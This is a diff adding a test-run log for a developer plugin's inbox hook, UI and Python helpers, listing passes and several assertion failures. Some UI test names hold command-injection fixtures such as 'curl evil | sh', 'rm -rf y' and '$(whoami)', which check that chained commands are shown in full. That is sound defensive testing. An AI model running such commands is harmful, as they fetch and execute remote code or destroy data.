+(pass) table edges > a table right after a paragraph, with no blank line [0.38ms]
+(pass) table edges > an escaped pipe splits the cell (decision: no escape handling); no word is lost [0.43ms]
+(pass) table edges > a table ends at the first line without a pipe [1.08ms]
+(pass) fence edges > info string is kept as lang; ~~~ fences; an indented fence [0.70ms]
+(pass) fence edges > a ~~~ fence is not closed by ``` [0.34ms]
+(pass) fence edges > a fence inside a bullet is not a fence (decision: a bullet whose text starts with backticks); no word lost [0.94ms]
+(pass) fence edges > [rec], # and ** inside a fence stay literal [0.29ms]
+(pass) fence edges > text after a would-be closing fence is code, not dropped [0.36ms]
+(pass) bodyBlocks (T2: sanitize, <br>, drop the title line, parse) > <br> in the E2 shape and <BR/> are line breaks [2.00ms]
+(pass) bodyBlocks (T2: sanitize, <br>, drop the title line, parse) > the first line equal to the title is dropped [1.20ms]
+(pass) bodyBlocks (T2: sanitize, <br>, drop the title line, parse) > only the first of two title lines is dropped [0.76ms]
+(pass) bodyBlocks (T2: sanitize, <br>, drop the title line, parse) > a body equal to the title gives no blocks and does not crash [1.47ms]
+(pass) bodyBlocks (T2: sanitize, <br>, drop the title line, parse) > real E1: its first line is its title [0.76ms]
+(pass) bodyBlocks (T2: sanitize, <br>, drop the title line, parse) > \r\n is one line break, and ESC, OSC and U+202E never reach the blocks [1.04ms]
+(pass) linear > one 10,000-character line: under 200 ms, words kept [3.83ms]
+(pass) linear > one 10,000-character word: under 200 ms, words kept [0.77ms]
+(pass) linear > 5,000 **: under 200 ms, words kept [1.49ms]
+(pass) linear > 5,000 unclosed **a openers: under 200 ms, words kept [8.67ms]
+(pass) linear > 5,000 **a**b pairs: under 200 ms, words kept [17.79ms]
+(pass) linear > 5,000 backticks: under 200 ms, words kept [1.08ms]
+(pass) linear > 5,000 spaced backticks: under 200 ms, words kept [2.47ms]
+(pass) linear > alternating ` and *: under 200 ms, words kept [1.66ms]
+(pass) linear > 10,000 pipes on one line: under 200 ms, words kept [0.62ms]
+(pass) linear > 2,000 table rows: under 200 ms, words kept [13.57ms]
+(pass) linear > 2,000 rows x 20 cells: under 200 ms, words kept [87.37ms]
+(pass) linear > unclosed fence of 5,000 lines: under 200 ms, words kept [17.37ms]
+(pass) linear > bullets nested to depth 2,500: under 200 ms, words kept [156.65ms]
+(pass) linear > 10,000 <br>: under 200 ms, words kept [38.79ms]
+(pass) linear > 2,000 headings and bullets: under 200 ms, words kept [10.85ms]
+(fail) linear > 4x the input takes under 12x the time (+20 ms) for bold, code and pipe cases [148.49ms]
+  AssertionError: expect(received).toBeLessThan()
+  
+  Expected: < 32
+  Received: 33
+(pass) linear > a far-away opener of the other kind is not searched for again at every span [243.59ms]
+(pass) linear > hostile fixtures all parse [1.87ms]
+(pass) real samples > E1 and E2 are byte copies: known substrings [0.48ms]
+(pass) real samples > E1: numbered items, three of them stay numbers, no raw syntax left on them [0.40ms]
+(pass) real samples > E2: E2 has seven [rec] lines, tags removed from the text [0.26ms]
+(pass) real samples > the real escalations table parses to a table [0.25ms]
+(pass) real samples > a body equal to the title is one paragraph with the title [0.12ms]
+(pass) real samples > the structured fixture holds every element [0.37ms]
+(pass) fence close and number width > a 1- or 2-char line of ` inside a ``` fence stays code [0.33ms]
+(pass) fence close and number width > a 1- or 2-char line of ~ inside a ~~~ fence stays code [0.16ms]
+(pass) fence close and number width > multi-digit numbers keep n as written; ten digits is plain text [0.53ms]
+
+hooks/po-inbox/mod.test.ts:
+(pass) inert: no env [186.02ms]
+(pass) inert: SQUAD_ROLE=dev with a home [155.06ms]
+(pass) inert: manager without a home [240.83ms]
+(pass) inert: a home without a role [133.27ms]
+(pass) active: manager with SCOPE_DIR [152.96ms]
+(pass) active: manager with only GOAL_DIR [136.00ms]
+(pass) poll: the CLI runs only when a mtime or size changed; an idle tick is two stats [142.42ms]
+(pass) poll: two writes in one mtime tick with a different size are noticed [99.30ms]
+(pass) poll: no second CLI run while one is pending (slow CLI) [196.27ms]
+(pass) toast: a first load none, an unchanged snapshot none, a new open id exactly one [141.71ms]
+(pass) toast: two new items in one change give one toast with the count [130.27ms]
+(pass) delivery: answer exit 0 submits once with describePrompt text, then delivered [25.02ms]
+(pass) delivery: the submit carries the snapshot answer text, not the pane input [21.57ms]
+(pass) delivery: exit 3 shows the message and submits nothing [1.82ms]
+(pass) delivery: answer recorded but list fails afterwards submits nothing and writes no delivered [22.19ms]
+(pass) redelivery: every answered-waiting item is submitted once at session.start [131.65ms]
+(pass) failure: a crash keeps the last good snapshot and sets the error state [102.75ms]
+(pass) failure: invalid JSON keeps the last good snapshot and sets the error state [121.53ms]
+(pass) failure: another version keeps the last good snapshot and sets the error state [124.63ms]
+(pass) failure: a wrong type keeps the last good snapshot and sets the error state [106.76ms]
+(pass) failed submit: no delivered, one retry at the next turn.complete, none in flight twice [129.38ms]
+(pass) delivered fails: the answer is submitted once, delivered retried once, then the error stays [135.82ms]
+(pass) in flight: a queued submit that is still pending is not submitted again [205.00ms]
+(pass) in flight: a second session.start while the first submit is queued submits once [127.02ms]
+(pass) submit dropped: not delivered, retried once, error shown [113.33ms]
+(pass) timers: two session.start leave one timer and one /inbox registration [114.28ms]
+(pass) timers: session.end stops the poll, a clear does not [111.17ms]
+(pass) argv: list runs `python3 <root>/bin/squad-inbox list --json` (Windows cannot spawn the extensionless script) [111.58ms]
+(pass) argv: answer, delivered and read run through python3 with the flags unchanged [31.49ms]
+
+hooks/po-inbox/testkit.test.ts:
+(pass) styleOf finds a bold, a dim and a coloured Text [12.16ms]
+(pass) rowsOfTree counts rendered rows by width [2.69ms]
+(pass) styleOf returns the innermost Text of a nested tree (the band shape) [0.56ms]
+(pass) rowsOfTree counts a row Box (the band shape) as one row, a wrapped one by its joined width [5.36ms]
+
+hooks/po-inbox/ui.test.ts:
+(pass) band-both [440.10ms]
+(pass) band-reads [159.39ms]
+(pass) band-answers [110.69ms]
+(pass) band-waiting [137.16ms]
+(pass) band-both adds waiting; band-errors counts problems [134.10ms]
+(pass) band-errors alone still draws the band [109.23ms]
+(pass) band-none: nothing open, nothing waiting, no error: the band is absent [93.06ms]
+(pass) band-narrow: the words follow the ladder by width (IV-04), the button stays [133.76ms]
+(pass) band: yields to a survey, counts show while a turn works [128.53ms]
+(pass) band button opens the pane focused [102.67ms]
+(pass) list-empty: nothing waits (B-07) [129.74ms]
+(pass) list-order: blocks work, blocks nothing, waiting; hotkeys 1..9 and d (B-06) [137.22ms]
+(pass) list-errors: each problem on its own line, other items still show (B-35) [95.76ms]
+(pass) list: a failed refresh is shown as a problem with the last snapshot kept [93.43ms]
+(pass) list-50 and list-long-title: nothing dropped (folded, 7 rows + +43 more), the long title cut with an ellipsis (B-36) [152.10ms]
+(pass) item-read: opening marks nothing; Mark read runs read R2 once and goes back (B-09..B-11) [119.64ms]
+(pass) item-answer-options: options, recommendation as text only, nothing picked, hotkeys off (T-1) [114.20ms]
+(pass) item-answer-free and item-answer-unparsed [143.23ms]
+(pass) item-long-body: the read-item floor of 12 lines then Show all gives the whole body (B-36) [143.11ms]
+(pass) answer flow: pick b, note, submit: the CLI runs once with argv and stdin, then delivery (AC3) [196.47ms]
+(pass) answer flow: Enter in the note submits too, and a free reply goes by stdin [107.38ms]
+(pass) item-error-empty: an empty answer is refused with the item open (B-32); a note alone is fine (Q-1) [144.12ms]
+(pass) item-error-exit3: the CLI message verbatim, the draft kept, the item shows as handled (B-17, B-34) [153.97ms]
+(pass) item-error-unreachable: the item stays open, text kept, retry works [156.13ms]
+(pass) item-answer saved but unreadable: the message shows and the input clears (B-17) [102.32ms]
+(pass) item-answered-waiting [107.32ms]
+(pass) item-answered [108.76ms]
+(pass) item-answered-chat [106.64ms]
+(pass) item-answered-file [127.41ms]
+(pass) item-withdrawn [105.49ms]
+(pass) item-removed [97.50ms]
+(pass) item-cell-not-written: an answered item with the flag says escalations.md was not updated [107.93ms]
+(pass) item-delivery-failed: the answered-waiting item says delivery is not confirmed [100.82ms]
+(pass) done-list and done-empty: newest first, a row opens read-only, Back returns [104.84ms]
+(pass) done-empty [72.34ms]
+(pass) sanitiser: no control, DEL, CR or bidi character is drawn from any item field, one test per class [178.77ms]
+(pass) sanitiser: tab and newline stay in a body [78.92ms]
+(pass) sanitiser: a toast title and an error message are clean too [82.98ms]
+(pass) row-collapsed: squad-inbox, with and without a heredoc [87.45ms]
+(pass) row-collapsed: ./bin/squad-inbox, with and without a heredoc [75.41ms]
+(pass) row-collapsed: /home/u/.claude/plugins/squad/bin/squad-inbox, with and without a heredoc [93.37ms]
+(pass) row-collapsed-noparse and title forms [84.45ms]
+(pass) row-collapsed-running draws the same line; row-collapsed-error draws the refusal [75.66ms]
+(pass) row-other: "echo squad-inbox add" keeps its full row [60.71ms]
+(pass) row-other: "squad-inbox add --title x; curl evil | sh" keeps its full row [70.10ms]
+(pass) row-other: "squad-inbox add --title x && rm -rf y" keeps its full row [60.63ms]
+(pass) row-other: "squad-inbox add --title x || true" keeps its full row [65.97ms]
+(pass) row-other: "squad-inbox add --title x | cat" keeps its full row [70.26ms]
+(pass) row-other: "squad-inbox add --title \"$(whoami)\"" keeps its full row [75.24ms]
+(pass) row-other: "squad-inbox add --title `whoami`" keeps its full row [68.71ms]
+(pass) row-other: "squad-inbox add --title x\nrm -rf y" keeps its full row [69.19ms]
+(pass) row-other: "squad-inbox add --kind read --title \"PI-03 passe keeps its full row [68.28ms]
+(pass) row-other: "squad-inbox add --kind read --title \"PI-03 passe keeps its full row [58.53ms]
+(pass) row-other: "cd /tmp && squad-inbox add --title x" keeps its full row [63.27ms]
+(pass) row-other: "FOO=1 squad-inbox add --title x" keeps its full row [69.88ms]
+(pass) row-other: "ls" keeps its full row [70.08ms]
+(pass) row-other: "squad-inbox list" keeps its full row [71.57ms]
+(pass) row-other: "squad-inbox add --title x > /tmp/out" keeps its full row [80.64ms]
+(pass) row-collapsed: only a Bash row; a non-Bash tool and a result of another call are untouched [74.09ms]
+(pass) ToolResult: the success result of a collapsed call draws nothing; an error and others stay [90.85ms]
+(pass) ToolGroup: a group of only collapsed adds draws pointer lines; a mixed group keeps its count [81.09ms]
+(pass) ToolResult: a failed add (exit code) keeps its result; a chained command is untouched in all three hooks [86.99ms]
+(pass) narrow viewport: the pane opens through /inbox and the band still draws (AC7) [70.53ms]
+(pass) a new item changes the count and raises no focus change or prompt call (B-08) [74.59ms]
+(pass) a command that hides another keeps its full row in ToolUse, ToolGroup and ToolResult [111.07ms]
+(pass) sanitiser: options_raw, the answer text, the shown draft and the collapsed title are clean [125.60ms]
+(pass) a refused answer (exit 3) keeps the typed text in the field; an accepted one clears text and pick [128.17ms]
+(pass) Mark read with a failing CLI shows the error and stays on the item (B-35) [97.07ms]
+(pass) no snapshot: the pane shows the error line, not "Nothing waits on you." [89.60ms]
+(pass) openPane closes the pane before it opens it [86.21ms]
+(pass) labels carry their hotkey hints (design §1, §2) [148.58ms]
+(pass) item body: <br> is a line break and the title is not repeated [106.39ms]
+
+ 489 pass
+ 1 fail
+Ran 490 tests across 10 files. [10.47s]
+
+
+----------------------------------------------------------------------
+Ran 2 tests in 12.877s
+
+FAILED (failures=1)
+
+===== test_process_conversion =====
+======================================================================
+ERROR: setUpClass (test_process_conversion.Mapping)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_process_conversion.py", line 129, in setUpClass
+    cls.rows = _mapping()
+               ~~~~~~~~^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_process_conversion.py", line 43, in _mapping
+    for ln in MAPPING.read_text(encoding="utf-8").split("\n"):
+              ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pathlib/_local.py", line 548, in read_text
+    return PathBase.read_text(self, encoding, errors, newline)
+           ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pathlib/_abc.py", line 632, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors, newline=newline) as f:
+         ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pathlib/_local.py", line 539, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory: '/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/.scratch/composed-process/issues/03-convert-process-to-rules/mapping.md'
+
+----------------------------------------------------------------------
+Ran 9 tests in 0.114s
+
+FAILED (errors=1)
+
+===== test_qab_optional =====
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [manager/L/no]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: '40c10b22c0c8fe1464f80b963fd815aaf32b67733542909b831ab90e27722b4f' != '64062075fd52a666fd52272398df2f7253f52db7d1a6f01872798239851be908'
+- 40c10b22c0c8fe1464f80b963fd815aaf32b67733542909b831ab90e27722b4f
++ 64062075fd52a666fd52272398df2f7253f52db7d1a6f01872798239851be908
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [manager/L/yes]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 'b94d029be959d363ad14d672121cd386675c2afd5d41e0d1b30b89f586f21cf1' != 'eb13104a0f55f8ef6ee3872400051bda43bb5387e7407642cc4e5f458baeec98'
+- b94d029be959d363ad14d672121cd386675c2afd5d41e0d1b30b89f586f21cf1
++ eb13104a0f55f8ef6ee3872400051bda43bb5387e7407642cc4e5f458baeec98
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [manager/M/no]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: '68918ad35c68ce6a46c104cfcf8420412c21e0e95e405d9c6315e3753c7c8d72' != '20c3a06864b6d960fba6f4357ebc1515ed458d64133ab09132ee48537d5ad669'
+- 68918ad35c68ce6a46c104cfcf8420412c21e0e95e405d9c6315e3753c7c8d72
++ 20c3a06864b6d960fba6f4357ebc1515ed458d64133ab09132ee48537d5ad669
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [manager/M/yes]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 'dfa357f0def3f357ab6b474063587c248d3d2cced36a39e340b6f89990f7053e' != '49d5bfc7f18f07034bb073daa49be9457f56227a61ece088f179e9f40aebdd21'
+- dfa357f0def3f357ab6b474063587c248d3d2cced36a39e340b6f89990f7053e
++ 49d5bfc7f18f07034bb073daa49be9457f56227a61ece088f179e9f40aebdd21
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [manager/S/no]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: '28c3457a261fe18e2aff2d17e96214cb8a408bfcd977587e1eced5c02de9dedf' != '2111ee7c0e5e7201aee3f50e4b0287c6e28d58d53eacbe472dbef95943bba4b5'
+- 28c3457a261fe18e2aff2d17e96214cb8a408bfcd977587e1eced5c02de9dedf
++ 2111ee7c0e5e7201aee3f50e4b0287c6e28d58d53eacbe472dbef95943bba4b5
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [manager/S/yes]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: '3779e5e6476a9c6c6da5dc3ce4eca0131da400255bd296849624bcd2a771f3af' != '8584a119958eeaabdeab7e655c83766adce9e2ce3e4b438b33228015eb0c0c32'
+- 3779e5e6476a9c6c6da5dc3ce4eca0131da400255bd296849624bcd2a771f3af
++ 8584a119958eeaabdeab7e655c83766adce9e2ce3e4b438b33228015eb0c0c32
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [tech-lead/L/no]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 'dd4b07b7ff8d3949a35bea81db02da5e78250f75fbf886a2844ea9f94e43dc00' != 'e82a7377dc020646d1e31ba5f0edc4d1b760de5d5b1a8b0c60dbffec5e37034e'
+- dd4b07b7ff8d3949a35bea81db02da5e78250f75fbf886a2844ea9f94e43dc00
++ e82a7377dc020646d1e31ba5f0edc4d1b760de5d5b1a8b0c60dbffec5e37034e
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [tech-lead/L/yes]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: '80266302e44e7e315a7f6cac40b65ebf78c52e7d09fbe409405db136f22e44eb' != 'b2e431f113613eaf97ea1b837ca33f572993edafa40234beb9d75896a21374cd'
+- 80266302e44e7e315a7f6cac40b65ebf78c52e7d09fbe409405db136f22e44eb
++ b2e431f113613eaf97ea1b837ca33f572993edafa40234beb9d75896a21374cd
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [tech-lead/M/no]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 'cc93455a64db802f6a8d166970646911ea9d488851881d24b5e21178d061653f' != 'c3acf0db50aa1d8264454ce287cf9707354116be7548581b0588db5d14621c15'
+- cc93455a64db802f6a8d166970646911ea9d488851881d24b5e21178d061653f
++ c3acf0db50aa1d8264454ce287cf9707354116be7548581b0588db5d14621c15
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [tech-lead/M/yes]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: '9d3346a3b34f1614208227addc49d6fee93f7b2881745c6df2562324c200f9ab' != '5271798ce42c32fbeac9026e707da5b5885ae43d4a9f22e5ac706e9346191549'
+- 9d3346a3b34f1614208227addc49d6fee93f7b2881745c6df2562324c200f9ab
++ 5271798ce42c32fbeac9026e707da5b5885ae43d4a9f22e5ac706e9346191549
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [tech-lead/S/no]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 'abbd416cc28413fc47c63ecc8d490caf6d66e25411d0a7a1b7bda0daab8edfd7' != '0fe88b70c723819f3da95af1a1687e6b3c437674796c1b2431047e0d8a268b19'
+- abbd416cc28413fc47c63ecc8d490caf6d66e25411d0a7a1b7bda0daab8edfd7
++ 0fe88b70c723819f3da95af1a1687e6b3c437674796c1b2431047e0d8a268b19
+
+
+======================================================================
+FAIL: test_every_role_matches_the_4901cab_golden (test_qab_optional.NoLineUnchanged.test_every_role_matches_the_4901cab_golden) [tech-lead/S/yes]
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_qab_optional.py", line 62, in test_every_role_matches_the_4901cab_golden
+    self.assertEqual(hashlib.sha256(normalise(r.stdout).encode()).hexdigest(), want)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 'eb3d459d038164bdce41cdb3ae3597b5335a11b09bd662cee51dc5832a77a00b' != '41f712fc3ea1b6b32ccaa81debfb1c4d27b943892bc0ef789d9aa1d1f844a566'
+- eb3d459d038164bdce41cdb3ae3597b5335a11b09bd662cee51dc5832a77a00b
++ 41f712fc3ea1b6b32ccaa81debfb1c4d27b943892bc0ef789d9aa1d1f844a566
+
+
+----------------------------------------------------------------------
+Ran 13 tests in 32.624s
+
+FAILED (failures=12)
+
+===== test_squadinbox =====
+======================================================================
+FAIL: test_no_pyc (test_squadinbox.NoBytecodeTest.test_no_pyc)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_squadinbox.py", line 674, in test_no_pyc
+    self.assertEqual(list((ROOT / "bin").rglob("*.pyc")), [])
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [PosixPath('/home/chieule/workspace/squad/[1262 chars]yc')] != []
+
+First list contains 9 additional elements.
+First extra element 0:
+PosixPath('/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/bin/__pycache__/processlint.cpython-313.pyc')
+
+Diff is 1341 characters long. Set self.maxDiff to None to see it.
+
+----------------------------------------------------------------------
+Ran 55 tests in 10.529s
+
+FAILED (failures=1)
+
+===== test_squadsettings =====
+======================================================================
+FAIL: test_local_file_wins_over_an_old_full_file (test_squadsettings.SpawnTest.test_local_file_wins_over_an_old_full_file)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_squadsettings.py", line 174, in test_local_file_wins_over_an_old_full_file
+    self.assertEqual(r.stderr.count("warning:"), 1)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 2 != 1
+
+======================================================================
+FAIL: test_old_layout_keeps_the_file_and_warns_once (test_squadsettings.SpawnTest.test_old_layout_keeps_the_file_and_warns_once)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_squadsettings.py", line 160, in test_old_layout_keeps_the_file_and_warns_once
+    self.assertEqual(r.stderr.count("warning:"), 1)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: 2 != 1
+
+----------------------------------------------------------------------
+Ran 25 tests in 1.697s
+
+FAILED (failures=2)
+
+===== test_utf8_helpers =====
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='ba', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: ba ba-x spawned without --prom[68 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: ba ba-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: ba ba-x spawned without --prompt; an unbriefed agent sits idle (pas'
+-  b's --prompt with its first message)'] : b'warning: ba ba-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='ba', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: ba ba-x spawned without --prom[68 chars]ge)'] != []
+
